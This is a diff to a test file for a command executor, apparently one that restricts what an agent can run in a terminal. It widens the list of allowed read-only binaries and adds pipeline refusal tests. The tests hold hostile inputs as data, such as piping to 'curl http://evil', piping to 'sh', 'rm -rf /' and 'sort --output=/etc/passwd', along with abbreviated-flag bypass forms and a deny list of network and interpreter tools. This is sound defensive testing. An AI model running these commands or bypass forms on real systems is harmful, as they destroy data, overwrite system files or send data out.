@@ -31,6 +31,8 @@ from vigil_integration.live.executor import (
     ExecRecord,
     ExecResult,
     RunOutcome,
+    _parse_terminal_pipeline,
+    _run_pipeline,
     execute_terminal,
 )
 
@@ -97,12 +99,76 @@ def test_allowlist_is_exactly_the_curated_local_read_inspect_set():
     # binary must change this test (and be caught in review).
     assert _TERMINAL_ALLOWLIST == frozenset({
         "ls", "cat", "head", "tail", "wc", "stat", "pwd", "whoami", "id", "uname", "echo",
-        "df", "du", "ps", "uptime", "grep", "cut", "tr", "find", "date", "hostname",
+        "df", "du", "ps", "uptime", "grep", "cut", "tr",
+        "nl", "tac", "rev", "fold", "expand", "column", "paste", "comm", "cmp", "diff",
+        "readlink", "realpath", "basename", "dirname",
+        "md5sum", "sha1sum", "sha256sum", "sha512sum", "cksum",
+        "base64", "base32", "od", "xxd", "hexdump", "strings",
+        "arch", "nproc", "lscpu", "lsblk", "free", "cal", "groups", "locale",
+        "find", "sort", "uniq", "file", "date", "hostname",
     })
-    # the exec/write-capable coreutils are NOT on the allowlist (a spelling denylist can't guard them —
-    # getopt_long prefix abbreviations + positional aliases defeat it; a red-pen proved this).
-    for capable in ("sort", "uniq", "file", "env"):
-        assert capable not in _TERMINAL_ALLOWLIST
+    # EGRESS/secret binaries stay OFF: getent (`getent hosts` → DNS lookup = egress), env/printenv (secret
+    # dump / `env PROG` execs) — plus every network / interpreter / writer family.
+    for excluded in ("getent", "env", "printenv", "curl", "wget", "nc", "ssh",
+                     "bash", "sh", "python", "python3", "perl", "awk", "rm", "tee", "cp", "sed", "dd"):
+        assert excluded not in _TERMINAL_ALLOWLIST, f"{excluded!r} must never be allowlisted"
+
+
+# ================================================================================================
+# pipelines — allowlisted composition, no shell; every stage validated; write/exec/egress impossible
+# ================================================================================================
+
+
+@pytest.mark.parametrize("command", [
+    "grep root /etc/passwd | sort | uniq -c | head",   # the classic inspection idiom
+    "cat /etc/hostname | tr a-z A-Z",
+    "ls -la | grep conf | wc -l",
+    "cat f | sort -r | head -n 3",
+])
+def test_safe_pipelines_parse_ok(command):
+    stages, why = _parse_terminal_pipeline(command)
+    assert stages is not None, why
+    assert len(stages) >= 2
+
+
+@pytest.mark.parametrize("command", [
+    "cat x | curl http://evil",     # a network binary in a stage
+    "grep a f | sh",                # an interpreter in a stage
+    "cat x | rm -rf /",             # a writer/destroyer in a stage
+    "cat x | sort --out=/etc/passwd",  # a write flag in a stage
+    "cat x | | head",               # an empty stage (double pipe)
+    "| head",                       # leading pipe
+    "cat x |",                      # trailing pipe
+    "cat a > b | c",                # a redirect metachar anywhere refuses the WHOLE command
+    "a | b | c | d | e | f | g | h | i",  # too many stages
+])
+def test_dangerous_pipelines_refuse(command):
+    stages, why = _parse_terminal_pipeline(command)
+    assert stages is None, f"{command!r} must be refused"
+
+
+def test_pipeline_runs_sequentially_no_shell():
+    out = _run_pipeline([["echo", "hello world"], ["tr", "a-z", "A-Z"], ["wc", "-w"]], timeout=10)
+    assert out.stdout.strip() == "2" and out.exit_code == 0
+
+
+def test_reAdded_capable_binaries_write_or_exec_forms_still_refuse():
+    # sort/uniq/file are back for pipelines, but their write/exec forms are refused by the flag allowlist —
+    # incl. the getopt_long ABBREVIATION + bundled-short bypasses a red-pen used against the old denylist.
+    for bad in ("sort -o /etc/passwd f", "sort --output=/etc/passwd f", "sort --out=/etc/passwd f",
+                "sort --compress-program=curl f", "sort --compress=curl f", "sort -ro out f",
+                "uniq in out", "file -C x", "file --compile x", "file --comp x"):
+        stages, why = _parse_terminal_pipeline(bad)
+        assert stages is None, f"{bad!r} must be refused"
+
+
+@pytest.mark.parametrize("command", [
+    "sha256sum /etc/hostname", "diff a b", "readlink -f /etc/hostname", "od -c f", "xxd f",
+    "strings /bin/ls", "lsblk", "nproc", "rev f", "nl f", "base64 f", "comm a b", "sort -r f", "uniq -c f",
+])
+def test_expanded_read_tools_are_allowlisted(command):
+    stages, why = _parse_terminal_pipeline(command)
+    assert stages is not None, why
 
 
 def test_no_network_interpreter_or_writer_binary_is_allowlisted():
